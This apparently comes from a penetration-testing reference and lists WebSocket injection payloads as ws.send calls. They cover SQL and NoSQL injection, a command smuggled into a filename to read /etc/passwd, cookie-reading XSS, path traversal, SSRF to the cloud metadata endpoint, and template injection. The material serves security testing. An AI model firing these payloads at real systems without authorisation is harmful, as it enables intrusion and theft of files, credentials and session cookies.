<injection_attacks>
{% raw %}
# Inject payloads in WebSocket messages

# SQL Injection
ws.send(JSON.stringify({
    type: 'search',
    query: "test' OR '1'='1"
}));

ws.send(JSON.stringify({
    type: 'user_lookup',
    email: "admin@example.com' OR 1=1--"
}));

# NoSQL Injection
ws.send(JSON.stringify({
    type: 'find',
    query: {"$gt": ""}
}));

# Command Injection
ws.send(JSON.stringify({
    type: 'process',
    filename: "data.txt; cat /etc/passwd"
}));

# XSS (if messages displayed in web UI)
ws.send(JSON.stringify({
    type: 'message',
    content: "<script>alert(document.cookie)</script>"
}));

ws.send(JSON.stringify({
    type: 'message',
    content: "<img src=x onerror=alert(1)>"
}));

# Path Traversal
ws.send(JSON.stringify({
    type: 'read_file',
    path: "../../../etc/passwd"
}));

# SSRF
ws.send(JSON.stringify({
    type: 'fetch_url',
    url: "http://169.254.169.254/latest/meta-data/"
}));

# Template Injection
ws.send(JSON.stringify({
    type: 'render',
    template: "{{7*7}}"
}));
{% endraw %}
</injection_attacks>

